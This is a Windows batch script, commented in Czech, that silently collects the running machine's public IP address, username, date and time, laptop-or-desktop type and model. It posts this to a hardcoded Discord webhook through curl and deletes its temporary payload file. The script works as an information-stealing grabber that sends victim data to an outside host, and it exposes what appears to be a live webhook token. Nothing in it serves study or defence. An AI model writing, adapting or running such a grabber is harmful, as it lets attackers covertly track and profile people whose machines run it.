@echo off
chcp 65001 >nul
setlocal EnableDelayedExpansion

:: ──────────────── SYSTEMOVÉ INFO ────────────────

:: 🌐 Webhook
set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N_ZDkZQ1TRUiAgqiaqhPpkgcN6KIiFO1m5PWw6aDAm0cFOE445el1c8"

:: 🌍 IP + uživatel
for /f "delims=" %%x in ('curl -s https://api.ipify.org') do set "ip=%%x"
set "user=%USERNAME%"

:: 🕒 Datum a čas
for /f "tokens=1-4 delims=. " %%x in ("%date%") do (
    set "d1=%%x"
    set "d2=%%y"
    set "d3=%%z"
)
for /f "tokens=1-2 delims=: " %%x in ("%time%") do (
    set "t1=%%x"
    set "t2=%%y"
)
set "timestamp=!d1!.!d2!.!d3! !t1!:!t2!"

:: 💻 Typ zařízení
set "deviceType=Stolní PC"
for /f %%i in ('wmic path Win32_Battery get Name ^| findstr /i /v "Name"') do (
    set "deviceType=Notebook"
)

:: 🖥️ Model
set "deviceModel=Neznámý model"
for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
    if not defined deviceModel (
        set "deviceModel=%%i"
    )
)

:: 🧾 Zpráva – IP s ||, RAM odstraněna, každý řádek zvlášť
set "msg=🛰️ Systémové info:^
IP: ||!ip! ||^
Čas: !timestamp!^
Uživatel: !user!^
Zařízení: !deviceType!^
Model: !deviceModel!"

:: ──────────────── ODESLÁNÍ NA WEBHOOK ────────────────

set "payload=%TEMP%\payload.json"
echo { > "!payload!"
echo   "content": "!msg!" >> "!payload!"
echo } >> "!payload!"
curl -s -X POST %webhook% -H "Content-Type: application/json" --data "@!payload!" >nul
del /f /q "!payload!"

:: ✅ Hotovo
exit
